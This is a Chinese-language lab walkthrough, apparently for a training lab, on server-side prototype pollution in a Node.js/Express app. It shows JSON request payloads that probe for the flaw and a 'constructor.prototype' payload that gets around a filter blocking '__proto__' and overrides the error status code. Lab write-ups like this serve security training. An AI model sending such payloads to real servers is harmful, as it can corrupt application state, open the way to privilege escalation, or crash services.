# 实验室：绕过服务端原型污染的有缺陷输入过滤器

本实验室基于 Node.js 和 Express 框架构建，由于不安全地将用户可控输入合并到服务端 JavaScript 对象中，存在服务端原型污染漏洞。

要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的原型污染源。
2. 识别一个可用于提升权限的小工具属性。
3. 访问管理面板并删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 在测试服务端原型污染时，可能会破坏应用程序功能甚至导致服务器完全崩溃。如果实验室发生这种情况，你可以使用实验室横幅中提供的按钮手动重启服务器。请记住，在测试真实网站时，你不太可能有此选项，因此务必谨慎操作。

探测
- 尝试批量赋值新属性
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "anatWOqSBfhx4TBIXxryUSOhMALqRfVi",
        "foo": "bar"
    }
    ```
    - 响应
        ```json
        "foo":"bar",
        "isAdmin":false
        ```
        - 反射新属性，JSON 字段被设置为对象属性

探测原型污染
- 发送异常请求，额外 JSON 末尾分隔符 `,`
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "anatWOqSBfhx4TBIXxryUSOhMALqRfVi",
    }
    ```
    - 响应
        ```json
        {
            "error": {
                "expose": true,
                "statusCode": 400,
                "status": 400,
                "body": "    {\r\n        \"address_line_1\": \"Wiener HQ\",\r\n        \"address_line_2\": \"One Wiener Way\",\r\n        \"city\": \"Wienerville\",\r\n        \"postcode\": \"BU1 1RP\",\r\n        \"country\": \"UK\",\r\n        \"sessionId\": \"anatWOqSBfhx4TBIXxryUSOhMALqRfVi\",\r\n    }",
                "type": "entity.parse.failed"
            }
        }
        ```
        - 默认错误响应码 400

- 尝试污染错误码
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "anatWOqSBfhx4TBIXxryUSOhMALqRfVi",
        "__proto__":{
            "status":456
        }
    }
    ```

- 尝试触发错误响应
    - 覆盖失败，响应码仍未 400

- 尝试转换为构造函数载荷
    ```json
    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "anatWOqSBfhx4TBIXxryUSOhMALqRfVi",
        "constructor": {
            "prototype": {
                "c_foo": "c_bar",
                "status":456
            }
        }
    }
    ```
    - 响应
        ```json
        "isAdmin":false,
        "c_foo":"c_bar",
        "status":456
        ```
        - 似乎成功反射原型污染属性

- 继续尝试错误码污染的错误探测，得到响应
    ```json
    {
        "error": {
            "expose": true,
            "statusCode": 456,
            "status": 456,
            "body": "    {\r\n        \"address_line_1\": \"Wiener HQ\",\r\n        \"address_line_2\": \"One Wiener Way\",\r\n        \"city\": \"Wienerville\",\r\n        \"postcode\": \"BU1 1RP\",\r\n        \"country\": \"UK\",\r\n        \"sessionId\": \"anatWOqSBfhx4TBIXxryUSOhMALqRfVi\",\r\n        \"constructor\": {\r\n            \"prototype\": {\r\n                \"c_foo\": \"c_bar\",\r\n\"status\":456\r\n            }\r\n        },\r\n    }",
            "type": "entity.parse.failed",
            "c_foo": "c_bar"
        }
    }
    ```
    - 成功覆盖错误码，并且错误对象访问污染原型属性
